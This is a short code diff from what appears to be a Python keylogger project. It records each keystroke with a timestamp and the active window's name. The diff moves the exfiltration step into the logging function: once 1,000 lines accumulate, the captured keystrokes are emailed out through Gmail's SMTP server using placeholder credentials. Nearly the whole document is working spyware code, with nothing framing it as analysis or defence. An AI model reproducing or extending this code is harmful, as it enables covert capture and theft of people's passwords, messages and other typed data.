@@ -7,22 +7,6 @@ from sys import setrecursionlimit
 
 log = ''
 
-# Function to check if it's time to send the log
-def check():
-    global log
-    nlines = log.count('\n')
-    if nlines >= 1000:
-        today = str(date.today())
-        email_text = 'Subject: Your e-mail subject' + today + '\n\n'
-        email_text += log
-        email_text = email_text.encode('utf-8')
-
-        connection = SMTP_SSL('smtp.gmail.com', 465)
-        connection.login('xxxxxxxxxx@gmail.com', 'xxxx xxxx xxxx xxxx') # Your email and Google App passwords created password
-        connection.sendmail('', 'xxxxxxxxxx@gmail.com', email_text)     # Your email again
-        connection.quit()
-        log = ''
-
 # Function to put the date, the name of the active window and the key in the log
 def add_log(skey):
     global log
@@ -35,6 +19,19 @@ def add_log(skey):
     except AttributeError:
         return False
     log += "\n" +  current_time_hour + ":" + current_time_minute + ":" + current_time_second + " | " + window_name + ": " + skey
+    # Check if it's time to send the log
+    nlines = log.count('\n')
+    if nlines >= 1000:
+        today = str(date.today())
+        email_text = 'Subject: Your e-mail subject' + today + '\n\n'
+        email_text += log
+        email_text = email_text.encode('utf-8')
+
+        connection = SMTP_SSL('smtp.gmail.com', 465)
+        connection.login('xxxxxxxxxx@gmail.com', 'xxxx xxxx xxxx xxxx') # Your email and Google App passwords created password
+        connection.sendmail('', 'xxxxxxxxxx@gmail.com', email_text)     # Your email again
+        connection.quit()
+        log = ''
 
 # Function that transform what the user types and send it to add_log function
 def press(key):
